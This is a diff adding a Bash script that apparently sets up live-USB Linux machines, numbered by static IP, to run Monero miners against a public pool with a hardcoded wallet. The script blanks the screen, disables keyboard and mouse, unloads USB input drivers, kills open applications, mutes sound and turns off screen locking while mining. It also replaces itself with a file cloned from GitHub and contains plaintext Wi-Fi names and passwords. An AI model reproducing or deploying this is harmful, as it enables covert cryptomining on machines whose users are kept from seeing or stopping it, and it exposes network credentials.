@@ -1,0 +1,867 @@
+#!/bin/bash
+
+getdirwh2() {
+SOURCE="${BASH_SOURCE[0]}"
+while [ -h "$SOURCE" ]; do # resolve $SOURCE until the file is no longer a symlink
+  DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
+  SOURCE="$(readlink "$SOURCE")"
+  [[ $SOURCE != /* ]] && SOURCE="$DIR/$SOURCE" # if $SOURCE was a relative symlink, we need to resolve it relative to the path where the symlink file was located
+done
+scriptname="$(awk -F'/' '{print $NF}' <<< "$0")"
+DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
+DIR0="$DIR/$scriptname"
+}
+getdirwh2
+#https://unix.stackexchange.com/questions/155551/how-to-debug-a-bash-script
+echo "$DIR0"
+#####1apreparet
+basic() {
+userid=$(awk -F: '!/root/ && /(\/bin\/bash)/ {printf $1}' /etc/passwd)
+mdir="/media/$userid"
+userhomedir="/home/$userid"
+autostartdir="$userhomedir/.config/autostart"
+cli=$(cat /proc/cmdline)
+mstart2filedir="$DIR0"
+pingcommand="ping -q -c 1 -W 3 google.com"
+ethernetinf=$(awk '/ether/ {gsub("[:]","");print $2}' <<< "$(ip -o link show)")
+#'$DIR0 !~ /(loopback)/'
+activeinetinf=$(awk '!/loopback|enp2s0f0/ && /UP/ {gsub("[:]","");print $2}' <<< "$(ip -o link show)")
+echo "$activeinetinf"
+chown $userid /cdrom ;
+}
+chmodeverything() {
+dir="/cdrom/notes/Documentsv2"
+#dir="$userhomedir/Documents/Documentsv2"
+#/home/ubuntu/Documents/Documentsv2
+sudo rm -f $dir/config.txt ;
+sudo rm -f $dir/nvidia.txt ;
+sudo rm -f $dir/cpu.txt ;
+sudo rm -f $dir/xmr-stak-master/bin/config.txt ;
+sudo rm -f $dir/xmr-stak-master/bin/nvidia.txt ;
+sudo rm -f $dir/xmr-stak-master/bin/cpu.txt ;
+sudo chmod -R +x $dir ;
+}
+runsetvar() {
+basic
+chmodeverything
+
+sfilename="start"
+sfiledir1="/cdrom/start"
+detectcli="text|textonly|systemd.unit=multi-user.target"
+curdm="lightdm"
+usbdir=$(awk '/'$userid'/ {printf $7"\n"}' <<< "$(lsblk)")
+usbdirc=$(echo "$usbdir" | wc -l)
+[[ $usbdirc -gt 1 ]] && echo "mount only 1 USB!!! pls restart" && sleep 3600
+echo "$usbdir"
+[[ -d "$usbdir" ]] && echo "USBDIR=$usbdir"
+sfiledir2="$usbdir/$sfilename"
+oldsfiledir="$usbdir/old$sfilename"
+c=("MBIOS" "MB1" "MB2" "MB3" "MB4" "MB5" "MB6" "MB7")
+USBMBIOSdir="$mdir/${c[0]}"
+[[ -d "$USBMBIOSdir" ]] && echo "MBIOS=$USBMBIOSdir"
+winthemedone="$dir/setupdone"
+gc1mf="$dir/1mcloned"
+onems2="1mstart2"
+threegsn="3gsnit"
+liveusb1msdir="$USBMBIOSdir/notes/Documentsv2/$onems2"
+livecur1msdir="$dir/$onems2"
+liveusb3gsdir="$USBMBIOSdir/notes/$threegsn"
+livecur3gsdir="$userhomedir/Documents/$threegsn"
+fn0="wintheme|inetstaton|checkdhcp|minertype"
+fn1="ipmode|choosetheme|resetdesktop|loginpsk|staticnomanual|checkxmr|startgnirehtet|runvpn|traprestart|startworking|cpgsnit|gitpushgsm|forceipmode|cp1m"
+
+#3mboth
+pa="pool.supportxmr.com:3333"
+wa="45kFvJmKx6DapX1bQ35YzLVAs8fa41XnAMZT952QCRRrC95DFCqnFC8NC4WfcVwKDTY8qJiFkYQu9F7E4rLcyVK8P8WQtxo"
+userno="x"
+xmrs="xmr-stak/build/bin/xmr-stak"
+xmrig="xmrig/build/xmrig"
+xmrign="xmrig-nvidia/build/xmrig-nvidia"
+currency="monero7"
+donate=0
+
+winthemescdir="$dir/wintheme"
+}
+updatetime() {
+#http://www.informit.com/articles/article.aspx?p=1161217&seqNum=11
+#sudo apt-get install -y ntp
+sudo cp /usr/share/zoneinfo/Australia/Melbourne /etc/localtime
+sudo hwclock --hctosys
+}
+
+#nmcli dev wifi
+#sudo iw dev wlan0 scan | grep SSID
+#https://askubuntu.com/questions/567006/how-can-i-display-the-list-of-available-wifi-networks
+#https://askubuntu.com/questions/423355/how-do-i-check-if-a-package-is-installed-on-my-server
+gitclone1m() {
+#sudo apt-get update --fix-missing ;
+#sudo apt-get install -y libmicrohttpd-dev \
+#libhwloc-dev \
+#wmctrl \
+#xdotool ;
+
+#sudo rm -f ~/Documents/Documentsv2/setupdone
+#sudo $cur1m
+
+if [[ $cli =~ ($detectcli) ]] ; then
+
+endno=$[${#c[@]}-1]
+for ((a=1;a<=$endno;a++)) ; do
+USBLABEL="${c[$a]}"
+USBDIR="$mdir/$USBLABEL"
+echo "$a $USBDIR"
+if [[ -d $USBDIR ]] ; then
+#$mdir/${c[0]}/notes/Documentsv2
+usbdocdir="$USBDIR/notes/Documentsv2"
+
+#gitclone1m
+if [[ ! -f "$gc1mf" ]] ; then
+#sudo apt-get install -y git
+cur1m=$dir/$onems2
+rm -rf $userhomedir/$onems2 ;
+rm -f $userhomedir/$onems2 ;
+cd $userhomedir
+git clone https://github.com/pagkly/$onems2.git
+mv $cur1m $cur1m\bk
+cp $userhomedir/$onems2/$onems2 $cur1m
+chmod +x $cur1m
+chown $userid $cur1m
+touch "$gc1mf"
+sleep 1
+usb1m="$usbdocdir/$onems2"
+mv $usb1m $usb1m\bk
+cp $userhomedir/$onems2/$onems2 $usbdocdir
+if [[ $cli =~ ($detectcli) ]] ; then
+#traprestart "cli"
+restartdm
+else
+traprestart
+fi
+
+fi
+
+else
+echo "$USBLABEL Not DETECTED"
+fi
+done
+
+fi
+
+}
+ 
+trial=$(cat <<EOF
+a=1
+endno=$[${#c[@]}-1]
+for ((a=$a;a<=$endno;a++)) ; do
+echo ${c[$a]}
+done
+EOF
+)
+umountusb() {
+#https://serverfault.com/questions/533844/disable-all-usb-devices-but-keyboard-mouse-flash-drive
+#kernel /vmlinuz-2.6.18-128.1.1.el5 ro root=LABEL=/ console=tty0 console=ttyS1,19200n8 nousb
+#https://www.linuxquestions.org/questions/linux-kernel-70/how-to-force-remove-a-kernel-module-686210/
+#https://serverfault.com/questions/41835/force-the-unloading-of-a-kernel-module-when-the-usb-devices-is-unplugged
+#https://askubuntu.com/questions/521222/how-to-unload-a-kernel-module-which-is-in-use
+#https://askubuntu.com/questions/896375/external-screen-recognized-but-black
+#lsmod
+#lspci
+#lsusb -t
+#lshw
+#lsof /dev/bus/usb/010/003 
+#ls -l /lib/modules/$(uname -r)/kernel/drivers
+if [[ -n $1 ]] ; then
+usbr="\/$1"
+else
+usbr=""
+fi
+mountno=($(awk '/('$mdir$usbr')/ {gsub("└─","");printf $1"\n"}' <<< "$(lsblk)"))
+mount=($(for f in ${mountno[@]} ; do echo ${f} | sed -e "s,[0-9],,g" ; done))
+for f in ${!mountno[@]} ; do udisksctl unmount -b /dev/${mountno[f]} && udisksctl power-off -b /dev/${mount[f]} ; done
+}
+
+checkdhcp() {
+#https://unix.stackexchange.com/questions/44376/how-to-find-out-if-ubuntu-is-using-dhcp-ubuntu-12-04-lts-gui?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa
+c=0
+until [[ -n "$activeinetinf" ]] || [[ $c -eq 100 ]] ; do
+echo "noinf"
+((c++))
+done
+
+if [[ $(ls /var/lib/dhcp) >/dev/null ]] ; then
+echo "DHCP connected"
+else
+
+if [[ -z $($pingcommand) ]] ; then
+if [[ $ethernetinf =~ (enp3s0) ]] && [[ -z $(awk "/static/ {print}" "$sfiledir1" ) ]] ; then
+loopstaticip
+
+
+if [[ $cli =~ ($detectcli) ]] ; then
+restartdm
+sleep 1
+exit
+fi
+
+elif [[ $ethernetinf =~ (enp3s0) ]] && [[ -n $(awk "/static/ {print}" "$sfiledir1" ) ]] ; then
+detectstaticineto
+elif [[ $activeinetinf =~ (wlp3s0b1) ]] ; then
+loginpsk
+fi
+fi
+
+fi
+
+gitclone1m &
+}
+getip() {
+extip="$(curl ipinfo.io/ip)"
+[[ -z extip ]] && echo "ipnull" || echo "$extip"
+#userno="123.456.789.10"
+}
+loopstaticip() {
+a=5
+until [[ -n $($pingcommand) ]] ; do
+echo "check $a"
+inetstaton $a
+if [[ $a -gt 35 ]] ; then
+traprestart
+a=5
+sleep 144000
+exit
+fi
+if [[ -n $($pingcommand) ]] ; then
+echo "$a connected"
+restartifaceold "$ethernetinf" &
+break
+fi
+((a++))
+done
+}
+detext() {
+##https://www.linuxjournal.com/content/return-values-bash-functions
+#local  __resultvar=$1
+#local  myresult='some value'
+#if [[ "$__resultvar" ]]; then
+#eval $__resultvar="'$myresult'"
+#else
+#echo "$myresult"
+#fi
+filedir=$1
+#detect
+if [ -f "$filedir" ] ; then
+dtext=$(awk '/'$2'/ {print}' $filedir)
+#replace
+if [[ ! -z "$dtext" ]] ; then
+dtextobject=$(awk '{gsub("'$2'","");print}' <<< "$dtext")
+echo "$dtextobject"
+fi
+fi
+return 0
+}
+detectstaticineto() {
+##https://unix.stackexchange.com/questions/25122/how-to-use-regex-with-awk-for-string-replacement?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa
+#perl -i -pe's/hello/bye/g' test.dat
+texttodetect="^(static)"
+dtextobject=$(detext "$sfiledir" "$texttodetect")
+if [[ ! -z $dtextobject ]] && [[ $($pingcommand) </dev/null ]]; then
+staticip=$dtextobject
+echo "$staticip"
+inetstaton "$staticip"
+awk '{gsub("'"$texttodetect"'","sta##tic");print}' "$sfiledir2" > "$usbdir/newstart" &&\
+mv $usbdir/newstart $usbdir/start
+else
+echo "DHCP"
+fi
+#umountusb &
+}
+loginpsk() {
+#https://askubuntu.com/questions/567006/how-can-i-display-the-list-of-available-wifi-networks
+disconnectcommand="nmcli d disconnect $activeinetinf"
+#nmcli dev wifi
+#sudo iw dev wlan0 scan | grep SSID
+wifilist=$(cat<<EOF
+OPTUS_A33E22;;carine@339204
+BelongKM7KJGQH;;4H3GYXTKYR
+EOF
+)
+wifilista=("$wifilist")
+lista="$wifilista"
+begno=1
+endno=$[${#wifilista[@]}+1]
+for ((i=$begno;i<=$endno;i++)) ; do
+SSID="$(awk -F';;' 'NR=='$i'{printf $1}' <<< "$wifilista")"
+PASSWD="$(awk -F';;' 'NR=='$i'{printf $2}' <<< "$wifilista")"
+detectwificommand="sudo iw dev wlan0 scan | grep "$SSID""
+connectcommand="nmcli d wifi connect "$SSID" password "$PASSWD""
+if [[ $1 =~ ^(t)$ ]] ; then
+#echo "$lista"
+#echo "$begno $endno"
+echo "$detectwificommand"
+echo "$connectcommand"
+elif [[ -z $1 ]] ; then
+$disconnectcommand
+[[ -n $detectwificommand ]] && $connectcommand
+fi
+done
+}
+inetstaton() {
+#https://unix.stackexchange.com/questions/44376/how-to-find-out-if-ubuntu-is-using-dhcp-ubuntu-12-04-lts-gui?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa
+#https://askubuntu.com/questions/360272/how-to-check-why-my-static-ip-isnt-working?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa
+#http://yallalabs.com/linux/how-to-setup-a-static-ip-address-on-ubuntu-16-lts/
+#winf="enp3s0"
+winf="$ethernetinf"
+sudo ifconfig $winf down
+sudo ip address flush $winf
+sudo ifconfig $winf up
+sudo rm -f /etc/network/interfaces ;
+echo "# interfaces(5) file used by ifup(8) and ifdown(8)
+auto lo
+iface lo inet loopback
+
+auto $winf
+iface $winf inet static
+address 192.168.1."$1 | sudo tee -a /etc/network/interfaces
+echo "netmask 255.255.255.0
+gateway 192.168.1.254
+dns-nameservers 192.168.1.83 8.8.8.8" | sudo tee -a /etc/network/interfaces
+sudo systemctl restart networking
+#sudo /etc/init.d/networking restart
+$pingcommand
+}
+restartifaceold() {
+winf=$1
+while true ; do
+if ping -q -c 1 -W 1 8.8.8.8 >/dev/null ; then
+echo "connected"
+break
+else
+echo "not connected"
+sudo rm -f /run/network/ifstate.$winf ;
+sudo ip addr flush dev $winf
+sudo ifdown $winf ;
+sleep 5
+sudo ip addr flush dev $winf
+sleep 5
+sudo ifup $winf ;
+sleep 5
+fi
+done
+
+$pingcommand
+sudo ip addr flush dev $winf
+sudo ifdown $winf ;
+sleep 5
+sudo ip addr flush dev $winf
+sleep 5
+sudo ifup $winf ;
+
+while true
+do
+$pingcommand
+if [[ -n $($pingcommand) ]] ; then
+echo "connected"
+break
+else
+echo "not connected"
+#sudo rm -f /run/network/ifstate.$winf ;
+sudo ifdown $winf ;
+sleep 5
+sudo ifup $winf ;
+fi
+
+done
+
+sudo ifdown $winf ;
+sleep 5
+sudo ifup $winf ;
+
+echo "restartifacedone"
+}
+resetinet() {
+ifacefiledir="/etc/network/interfaces"
+sudo rm -f $ifacefiledir
+sudo ip address flush enp3s0
+echo "auto lo
+iface lo inet loopback" | sudo tee -a $ifacefiledir
+sudo mv $oldsfiledir $sfiledir2 ;
+}
+
+staticnomanual() {
+while true ; do
+read -p "compno : " compno
+echo "$compno"
+#a=0
+#while [ $a -lt 8 ] ; do
+endno=${#c[@]}
+for ((a=1;a<=$endno;a++)) ; do
+USBLABEL="${c[$a]}"
+USBDIR="$mdir/$USBLABEL"
+echo "$a $USBDIR"
+if [[ -d $USBDIR ]] ; then
+sudo rm -f $USBDIR/start ;
+echo "static$compno" | sudo tee -a $USBDIR/start
+cat $USBDIR/start
+else
+echo "$USBLABEL Not DETECTED"
+fi
+done
+#a=$[$a+1]
+#done
+
+read -p "restart (y/n)" restart
+if [[ $restart =~ (y) ]] ; then
+echo "restart"
+elif [[ $restart =~ (n) ]] ; then
+exit
+fi
+done
+}
+
+#####1mstart2
+createscript() {
+extfunc1="$1"
+sourcedir="$3"
+echo '#!/bin/bash' | tee $extfunc1
+awk "/^((basic)[(][)][ ])[{]/,/^}/ {print}" $sourcedir | tee -a $extfunc1
+echo "basic" | tee -a $extfunc1
+awk "/^(($2)[(][)][ ])[{]/,/^}/ {print}" $sourcedir | tee -a $extfunc1
+echo "$4" | tee -a $extfunc1
+chmod +x $extfunc1 ;
+#xterm -hold -e "whoami && $extfunc1" &
+#sleep 2
+#rm -f "$extfunc1";
+}
+createdesktopfile() {
+name=$(awk '{gsub(".desktop","");print}' <<< "$2")
+echo "[Desktop Entry]
+Version=1.0
+Name=$name
+Comment=$name
+Exec=$3
+Path=$1
+Terminal=false
+Type=Application
+Categories=Utility;Development;" | sudo tee -a $1/$2 ;\
+sudo chmod +x $1/$2 ;
+return 0
+}
+
+setupdocdir() {
+sudo rm -f $dir/M*.desktop ;
+createdesktopfile "$dir" "MCLI.desktop" "xterm -hold -e \"echo ip | $mstart2filedir 1\""
+createdesktopfile "$dir" "MP.desktop" "xterm -hold -e \"$mstart2filedir 1\""
+createdesktopfile "$dir/androidtether/gnirehtet-java" "startandt.desktop" "xterm -hold -e \"$dir/androidtether/gnirehtet-java/gnirehtet run\""
+#createdesktopfile "$dir" "MV.desktop" "xterm -hold -e \"$dir/FOVPN/FreeVPNconnect.sh\""
+#createdesktopfile "$dir" "WT.desktop" "echo wintheme | sudo -E $mstart2filedir"
+#createdesktopfile "$dir" "WT.desktop" "sudo -E $winthemescdir"
+rsync -a $dir/TW/after2/ $userhomedir/ 
+sudo chown -R $userid $dir ;
+sudo chown -R $userid /home ;
+
+sudo sed -i 's,Exec=/usr/bin/google-chrome-stable %U,Exec=/usr/bin/google-chrome-stable --password-store=basic %U,g' /usr/share/applications/google-chrome.desktop ;
+ln -s $dir $userhomedir/Documents ;
+mkdir -p $autostartdir ;
+
+if [[ $cli =~ ($detectcli) ]] ; then
+
+if [[ $runpreenv =~ (on) ]] ; then
+ln -s $dir/MCLI.desktop $autostartdir ;
+#MCLI2
+#offmonitormousekeybret
+else
+ln -s $dir/MCLI.desktop $autostartdir ;
+#ln -s $dir/MP.desktop $autostartdir ;
+fi
+echo "$runpreenv"
+else
+ln -s $dir/MP.desktop $autostartdir ;
+fi
+#createscript "$winthemescdir" "wintheme|oldwinthemer|newwinthemer" "$mstart2filedir" "wintheme"
+#ln -s $dir/WT.desktop $autostartdir
+}
+
+restartdm(){
+xhost +
+sudo service $curdm restart
+}
+
+offmonitormousekeybret() {
+#https://www.cyberciti.biz/faq/linux-disable-modprobe-loading-of-usb-storage-driver/
+#quiet splash i8042.nokbd
+#sudo rm -R /lib/modules/$(uname -r)/kernel/drivers/hid/usbhid
+##https://unix.stackexchange.com/questions/60078/find-out-which-modules-are-associated-with-a-usb-device
+##cat idVendor idProduct manufacturer product
+#grep -l '^3$' /sys/bus/usb/devices/10-*/devnum     # the ^ and $ to prevent also matching 13, 31, etc.
+#cd /sys/bus/usb/devices/10-2
+#setterm --blank 1
+#setterm --blank force
+#setterm --powersave powerdown
+#https://unix.stackexchange.com/questions/237799/laptop-with-bad-monitor-turned-into-server-how-to-disable-monitor
+#https://askubuntu.com/questions/896375/external-screen-recognized-but-black
+for id in `xinput --list|grep 'Gaming\|Mouse\|MOUSE\|pointer\|keyboard\|Keyboard\|Type\|Cover\|Razer\|Logitech\|Microsoft\|HP\|Dell\|Apple\|Lenovo'|perl -ne 'while (m/id=(\d+)/g){print "$1\n";}'`; do
+    xinput set-prop $id 'Device Enabled' 0
+done
+#sudo service lightdm stop ;
+#sudo service gdm stop ;
+#sudo service gdm3 stop ;
+sudo tee /sys/class/backlight/acpi_video0/brightness <<< 0
+sudo tee /sys/class/backlight/intel_backlight/brightness <<< 0
+sudo setterm -powersave on -blank force
+sudo setterm -background black -foreground black -cursor off -clear all
+#while true; do sleep 1 && sudo setterm -background black -foreground black -cursor off -clear all ; done &
+sleep 1 && sudo xset dpms force off
+sleep 1 && sudo vbetool dpms off
+while true ; do xset dpms force off && clear ; done &
+sudo modprobe -rf hid_generic usbhid snd_hda_codec_hdmi
+sudo rmmod -f hid_generic usbhid snd_hda_codec_hdmi
+return 0
+}
+
+
+mnowl() {
+gitpushgsm
+sudo rm -rf $userhomedir/$onems2 ;
+sudo rm -rf $userhomedir/$threegsn ;
+sudo rm -rf $dir/$threegsn ;
+sudo rm -rf $dir/others ;
+
+offmonitormousekeybret
+nvidiap=""
+if lspci | grep "Nvidia" >/dev/null; then
+  echo "Nvidia p"
+else
+  echo "no Nvidia"
+  nvidiap="--noNVIDIA"
+fi
+
+if lspci | grep Intel >/dev/null; then
+  echo "Intel p"
+fi
+
+sudo killall nautilus ;
+sudo killall chrome ;
+sudo killall gedit ;
+wmctrl -r "user" -b toggle,shaded ;
+wmctrl -k on ;
+
+#https://askubuntu.com/questions/17157/how-do-i-stop-the-screen-from-being-locked-on-suspend
+sudo sed -i "s,LOCK_SCREEN=true,#LOCK_SCREEN=true,g" /etc/default/acpi-support
+offmonitormousekeybret
+amixermute
+gsettings set org.gnome.desktop.lockdown disable-lock-screen 'true'
+gsettings set org.gnome.desktop.screensaver ubuntu-lock-on-suspend 'false'
+gsettings set org.gnome.desktop.screensaver lock-enabled false
+gsettings set org.gnome.desktop.session idle-delay 0
+
+#umountusb
+
+while true ; do 
+if [[ $($pingcommand) >/dev/null ]] ; then 
+echo "connected"
+else
+
+if [[ $(ls /var/lib/dhcp) >/dev/null ]] && [[ $ethernetinf =~ (enp3s0) ]] && [[ -z $(awk "/static/ {print}" "$sfiledir1" ) ]] ; then 
+loopstaticip
+else
+sudo ifconfig $ethernetinf down && sleep 5 && sudo ifconfig $ethernetinf up
+fi
+
+fi
+sleep 30
+umountusb
+done
+return 0
+}
+
+minertype() {
+mtype=$1
+getip
+if [[ $mtype =~ ^(1)$ ]] ; then
+xterm -hold -e "sudo $dir/$xmrs -r \"\" -i 0 --currency $currency -o $pa -u $wa -p $userno" &
+elif [[ $mtype =~ ^(4)$ ]] ; then
+#CPUONLY
+xterm -hold -e "sudo $dir/$xmrig -o $pa -u $wa --donate-level=$donate% -p $userno" &
+elif [[ $mtype =~ ^(5)$ ]] ; then
+##NVIDXMRIG
+xterm -hold -e "sudo $dir/$xmrign -o $pa -u $wa --donate-level=$donate% -p $userno" &
+elif [[ $mtype =~ ^(10)$ ]] ; then
+userno=0
+userno=$extip
+xterm -hold -e "sudo $dir/$xmrig -o $pa -u $wa --donate-level=$donate% -p $userno" &
+xterm -hold -e "sudo $dir/$xmrign -o $pa -u $wa --donate-level=$donate% -p $userno" &
+fi
+}
+ipmode() {
+#forautomb
+if [[ -f "$gc1mf" ]] ; then
+echo "ipmode"
+minertype "10"
+if [[ $runpreenv =~ (on) ]] ; then
+mnowl
+fi
+fi
+}
+forceipmode() {
+#formbiosonly
+sudo killall xmrig ;
+sudo killall xmrig-nvidia ;
+runpreenv="off"
+touch "$gc1mf"
+ipmode &
+sleep 5
+mnowl
+}
+
+amixermute() {
+amixer -D pulse sset Master mute ;
+}
+wintheme() {
+#screensavernmute
+gsettings set org.gnome.desktop.lockdown disable-lock-screen 'true'
+gsettings set org.gnome.desktop.screensaver ubuntu-lock-on-suspend 'false'
+gsettings set org.gnome.desktop.screensaver lock-enabled false
+gsettings set org.gnome.desktop.session idle-delay 0
+#desktop
+#dconf write /org/gnome/shell/favorite-apps "['org.gnome.Nautilus.desktop', 'org.gnome.Terminal.desktop', 'org.gnome.gedit.desktop']"
+gsettings set org.gnome.shell favorite-apps "['org.gnome.Nautilus.desktop', 'org.gnome.Terminal.desktop', 'org.gnome.gedit.desktop']"
+gsettings set org.gnome.desktop.interface enable-animations false
+#winthemer
+gsettings set org.gnome.shell enabled-extensions "['TopIcons@phocean.net', 'appindicatorsupport@rgcjonas.gmail.com', 'remove-dropdown-arrows@mpdeimos.com', 'user-theme@gnome-shell-extensions.gcampax.github.com', 'dash-to-panel@jderose9.github.com', 'gnomenu@panacier.gmail.com']"
+gsettings set org.gnome.desktop.wm.preferences button-layout ':minimize,maximize,close'
+gsettings set org.gnome.desktop.interface icon-theme "Windows-10-Icons-master"
+gsettings set org.gnome.desktop.interface gtk-theme "Windows-10-master"
+gsettings set org.gnome.shell.extensions.user-theme name "Windows-10-master"
+newwinthemer
+}
+newwinthemer() {
+gnoextuserdir="$userhomedir/.local/share/gnome-shell/extensions"
+extlist=$(cat <<EOF
+topicons;;TopIcons@phocean.net;;topicons
+dtp;;dash-to-panel@jderose9.github.com;;dash-to-panel
+gnomenu;;gnomenu@panacier.gmail.com;;gnomenu
+rda;;remove-dropdown-arrows@mpdeimos.com;;remove-dropdown-arrows
+ut;;user-theme@gnome-shell-extensions.gcampax.github.com;;user-theme
+EOF
+)
+extcallarray=($(awk -F";;" '{print $1}' <<< "$extlist"))
+extnamearray=($(awk -F";;" '{print $2}' <<< "$extlist"))
+extfnarray=($(awk -F";;" '{print $3}' <<< "$extlist"))
+for f in ${!extcallarray[@]} ; do
+#echo "${extcallarray[f]};;${extnamearray[f]};;${extfn[f]}"
+eval ${extcallarray[f]}dir="$gnoextuserdir/${extnamearray[f]}/schemas"
+eval ${extcallarray[f]}sc="org.gnome.shell.extensions.${extfnarray[f]}"
+bla="${extcallarray[f]}sc"
+#echo "${!bla}"
+#gsettings set org.gnome.shell enabled-extensions "['"${extnamearray[f]}"']"
+done
+gsettings --schemadir "$topiconsdir" set $topiconssc tray-pos 'Center'
+gsettings --schemadir "$topiconsdir" set $topiconssc tray-order '2'
+gsettings --schemadir "$dtpdir" set "$dtpsc" panel-position 'BOTTOM'
+gsettings --schemadir "$dtpdir" set "$dtpsc" location-clock 'STATUSRIGHT'
+gsettings --schemadir "$gnomenudir" set $gnomenusc disable-activities-hotcorner 'true'
+gsettings --schemadir "$gnomenudir" set $gnomenusc hide-panel-view 'true'
+gsettings --schemadir "$gnomenudir" set $gnomenusc hide-panel-apps 'true'
+gsettings --schemadir "$gnomenudir" set $gnomenusc panel-menu-label-text ["''"]
+gsettings --schemadir "$gnomenudir" set $gnomenusc disable-panel-menu-keyboard 'true'
+gsettings --schemadir "$gnomenudir" set $gnomenusc hide-shortcuts 'true'
+gsettings --schemadir "$gnomenudir" set $gnomenusc hide-useroptions 'true'
+}
+resetdesktop() {
+rm -f $winthemedone
+}
+choosetheme() {
+layoutmanagerdir="$dir/TW/layoutmanager.sh"
+sudo chmod +x $layoutmanagerdir
+$layoutmanagerdir &
+}
+checkxmr() {
+command=$(cat <<EOF
+/opt/google/chrome/chrome --password-store=basic --tab "supportxmr.com/#/dashboard" --tab "google.com/45kFvJmKx6DapX1bQ35YzLVAs8fa41XnAMZT952QCRRrC95DFCqnFC8NC4WfcVwKDTY8qJiFkYQu9F7E4rLcyVK8P8WQtxo"
+EOF
+)
+nohup xterm -hold -e "$command" & 
+#disown
+#cxmrsc="./checkxmr"
+#echo '#!/bin/bash' | tee "$cxmrsc"
+#echo "$command" | tee -a "$cxmrsc"
+#chmod +x $cxmrsc
+#$cxmrsc & disown
+}
+startgnirehtet() {
+startandtdir="$dir/androidtether/gnirehtet-java/gnirehtet"
+sudo chmod +x $startandtdir
+xterm -hold -e "$startandtdir run" &
+}
+runvpn() {
+xterm -hold -e \"$dir/FOVPN/FreeVPNconnect.sh\"
+}
+startworking() {
+#https://stackoverflow.com/questions/9117507/linux-unix-command-to-determine-if-process-is-running
+[[ -z $(awk '/nautilus/' <<< "$(ps cax)") ]] && nohup nautilus "$dir" & disown
+[[ -z $(awk '/gedit/' <<< "$(ps cax)") ]] && nohup gedit "$livecur3gsdir" "$livecur1msdir" & disown 
+[[ -z $(awk '/chrome/' <<< "$(ps cax)") ]] && checkxmr & disown
+}
+checkcur1m() {
+if [[ ! -f "$livecur1msdir" ]] ; then
+cp1m
+fi
+}
+cp1m() {
+mv $livecur1msdir $livecur1msdir\bk
+cp "$liveusb1msdir" "$livecur1msdir"
+chmod +x $livecur1msdir
+chown $userid "$livecur1msdir"
+}
+cpgsnit() {
+if [[ ! -f "$livecur3gsdir" ]] ; then
+mv $livecur3gsdir $livecur3gsdir\bk ;
+cp "$liveusb3gsdir" "$livecur3gsdir"
+chmod +x $livecur3gsdir
+chown $userid "$livecur3gsdir"
+fi
+}
+gitpushgsm() {
+if [[ ! -f "$livecur3gsdir" ]] ; then
+cpgsnit
+fi
+if [[ -f "$liveusb3gsdir" ]] ; then
+"$livecur3gsdir" gsmonce
+fi
+}
+
+#####FNENGINE
+traprestart() {
+trap SIGINT
+echo $DIR0
+#xterm -hold -e "$DIR0 1" & disown $!
+if [[ $1 =~ (cli) ]] ; then
+#https://askubuntu.com/questions/5172/running-a-desktop-file-in-the-terminal
+#gnome-terminal -e "echo ip | $DIR0 1" & disown $!
+xterm -hold -e "echo ip | $DIR0 1" & disown $!
+else
+gnome-terminal -e "$DIR0 1" & disown $!
+fi
+sleep 1
+exit
+return 0
+}
+populatefn() {
+if [[ -n "$3" ]] ; then
+startno="$3"
+else
+startno="0"
+fi
+allfn=$(awk '/('$1')[(][)] {/ {gsub("([(){])",""); print }' <<< "$(cat $2)")
+popfn="${popfn}"$'\n'"$allfn"
+allfnarray=($allfn)
+popfnarray=($popfn)
+totalallfn=$[${#allfnarray[@]}+$startno]
+echo "$totalallfn"
+}
+printallfn() {
+for f in ${!popfnarray[@]} ; do
+echo $[$f+1]".${popfnarray[f]}"
+done
+}
+errorc=0
+choosefn() {
+read fnno
+
+if [[ $fnno =~ ^([0-9]) ]] ; then
+n=$[$fnno-1]
+fn="${popfnarray[$[$fnno-1]]}"
+echo "$n.$fn"
+
+if [[ $fn =~ (wintheme) ]] ; then
+$fn
+elif [[ $fn =~ (inetstaton) ]] ; then
+read -p 'COMPNO : ' number
+echo "Static ip for $number!"
+$fn "$number" &
+elif [[ $fn =~ (loopstaticip) ]] ; then
+$fn &
+elif [[ $fn =~ (minertype) ]] ; then
+read -p "MTYPE :"  mtype
+echo "$mtype!"
+$fn "$mtype"
+elif [[ $fn =~ ($fn1) ]] ; then
+$fn &
+fi
+
+
+elif [[ $fnno =~ (wintheme) ]] ; then
+$fn
+elif [[ $fnno =~ (inetstaton) ]]; then
+read -p 'COMPNO : ' number
+echo "Static ip for $number!"
+$fn "$number" &
+elif [[ $fnno =~ (loopstaticip) ]] ; then
+$fn &
+elif [[ $fnno =~ (minertype) ]] ; then
+read -p "MTYPE :"  mtype
+echo "$mtype!"
+$fn "$mtype"
+elif [[ $fnno =~ ($fn1) ]] ; then
+echo $fnno
+$fnno &
+elif [[ $fnno =~ ^(ip|ipmode)$ ]] ; then
+ipmode
+else
+if [[ $errorc -eq 100 ]] ; then
+sleep 1440000
+fi
+echo "nftrya"
+((errorc++))
+
+fi
+
+echo $fnno
+
+return 0
+}
+runlistfn() {
+if [[ -f "$livecur3gsdir" ]] && [[ -f "$liveusb3gsdir" ]] && [[ -d "$USBMBIOSdir" ]] ; then
+#startworking
+echo "sw"
+fi
+trap "traprestart" INT
+while true ; do
+popfn=""
+popfn0="($fn0|ipmode|$fn1)"
+populatefn "$popfn0" "$DIR0"
+printallfn
+choosefn
+done
+trap SIGINT
+}
+
+detectrunpreenvo() {
+texttodetect="(runpreenv)"
+dtextobject=$(detext "$sfiledir1" "$texttodetect")
+if [[ ! -z $dtextobject ]] ; then
+runpreenv="$dtextobject"
+echo "rpenvo=$runpreenv"
+fi
+}
+#detectrunpreenvo
+prerun() {
+runsetvar
+runpreenv=$(detectrunpreenvo)
+if [[ ! -f "$winthemedone" ]] ; then
+touch "$winthemedone" ;
+setupdocdir
+cpgsnit
+updatetime
+restartdm
+fi
+wintheme &
+checkdhcp &
+##sudo cp $mdir/MB4/Pass/* /etc/NetworkManager/system-connections
+}
+prerun
+if [[ $1 =~ ^(1)$ ]] ; then
+runlistfn
+#else
+#sudo service lightdm stop
+fi
